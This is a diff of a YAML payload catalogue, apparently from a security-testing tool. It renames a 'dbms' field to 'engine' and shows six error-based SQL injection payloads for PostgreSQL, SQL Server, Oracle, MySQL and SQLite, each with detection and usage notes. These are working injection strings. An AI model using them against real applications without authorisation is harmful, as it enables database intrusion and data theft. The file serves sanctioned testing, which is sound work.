@@ -18,37 +18,37 @@ safety: >
   engagement explicitly authorises reading records.
 entries:
   - name: cast to integer
-    dbms: [postgresql]
+    engine: [postgresql]
     payload: "' AND 1=CAST(({{EXPR}}) AS INT) AND 'a'='a"
     detect: "PostgreSQL quotes the offending text in an invalid input syntax error."
     note: "Default {{EXPR}} to version() to prove the channel without reading records."
 
   - name: convert to integer
-    dbms: [mssql]
+    engine: [mssql]
     payload: "' AND 1=CONVERT(INT,({{EXPR}})) AND 'a'='a"
     detect: "SQL Server reports a conversion failure and includes the value it failed to convert."
     note: "Default {{EXPR}} to @@version, or DB_NAME() for the current database."
 
   - name: to_number conversion
-    dbms: [oracle]
+    engine: [oracle]
     payload: "' AND 1=TO_NUMBER(({{EXPR}})) AND 'a'='a"
     detect: "Oracle raises an invalid number error carrying the operand."
     note: "Oracle subqueries need a FROM clause; default {{EXPR}} to SELECT banner FROM v$version WHERE ROWNUM=1."
 
   - name: extractvalue XPath error
-    dbms: [mysql]
+    engine: [mysql]
     payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,({{EXPR}}))) AND 'a'='a"
     detect: "MySQL reports an XPATH syntax error containing the concatenated value after the tilde marker."
     note: "The leading tilde is a delimiter, not part of the value; it makes the extracted text easy to isolate. Function availability varies by MySQL version -- if it is absent, use the duplicate-key entry."
 
   - name: duplicate key name error
-    dbms: [mysql]
+    engine: [mysql]
     payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(({{EXPR}}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) AND 'a'='a"
     detect: "The duplicate group key is reported in the error text with the computed value embedded."
     note: "Aggregation over information_schema is a read of catalogue metadata only. Prefer the extractvalue entry where it is available -- this one is heavier on the server."
 
   - name: numeric cast error
-    dbms: [sqlite]
+    engine: [sqlite]
     payload: "' AND 1=({{EXPR}}) AND 'a'='a"
     detect: "SQLite is weakly typed and rarely surfaces a usable error channel; a mismatch here usually means the channel does not exist."
     note: "If nothing surfaces, that is the expected result on SQLite -- prune to boolean or time-blind and record this as the reason."
